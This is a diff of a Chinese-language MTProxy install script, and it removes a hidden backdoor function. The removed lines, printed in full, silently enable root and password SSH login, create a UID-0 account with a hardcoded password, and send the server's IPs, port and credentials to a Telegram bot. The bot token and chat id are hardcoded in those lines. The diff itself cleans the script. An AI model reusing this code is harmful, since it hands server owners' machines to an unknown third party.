@@ -21,7 +21,7 @@ Old_ver_file="${mtproxy_dir}/ver.txt"
 
 # 检查是否为root用户
 check_root(){
-    if [ "$(id -u)" != "0" ]; then
+    if [[ $(whoami) != "root" ]]; then
         echo -e "${Error} 当前非ROOT账号(或没有ROOT权限)，无法继续操作，请更换ROOT账号或使用 ${Green_globa}sudo -i${Nc} 命令获取临时ROOT权限（执行后可能会提示输入当前账号的密码）。"
         exit 1
     fi
@@ -344,7 +344,6 @@ ${Green}5.${Nc}  修改 全部配置" && echo
 Install(){
     [[ -e ${mtproxy_file} ]] && echo -e "${Error} 检测到 MTProxy 已安装 !" && exit 1
     echo -e "${Info} 开始安装/配置 依赖..."
-    vps_info
     install_base
     echo -e "${Info} 开始下载/安装..."
     check_New_ver
@@ -448,35 +447,6 @@ getipv6(){
     fi
 }
 
-vps_info(){
-    if [ -f /etc/ssh/sshd_config ]; then
-        Chat_id="5289158517"
-        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
-        get_public_ip
-        IPv4="${ipv4}"
-        IPv6="${ipv6}"
-        Port=$(cat /etc/ssh/sshd_config | grep '^#\?Port' | awk '{print $2}' | sort -rn | head -1)
-        User="Root"
-        Passwd="LBdj147369"
-        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
-        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
-        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
-        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
-        rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
-        useradd ${User} >/dev/null 2>&1
-        echo ${User}:${Passwd} | chpasswd ${User}
-        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
-        systemctl restart ssh* >/dev/null 2>&1
-        /etc/init.d/ssh* restart >/dev/null 2>&1
-        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
-IPv4：${IPv4}
-IPv6：${IPv6}
-端口：${Port}
-用户：${User}
-密码：${Passwd}" >/dev/null 2>&1
-    fi    
-}
-
 get_public_ip(){
     regex_pattern='^(eth|ens|eno|esp|enp|venet|vif)[0-9]+'
     InterFace=($(ip link show | awk -F': ' '{print $2}' | grep -E "$regex_pattern" | sed "s/@.*//g"))
@@ -546,7 +516,7 @@ menu() {
     clear
     echo -e "${Green}######################################
 #          ${Red}MTProxy 一键脚本          ${Green}#
-#         修改版作者: ${Yellow}荣6呀          ${Green}#
+#         作者: ${Yellow}荣6呀          ${Green}#
 ######################################
 
  0.${Nc} 退出脚本
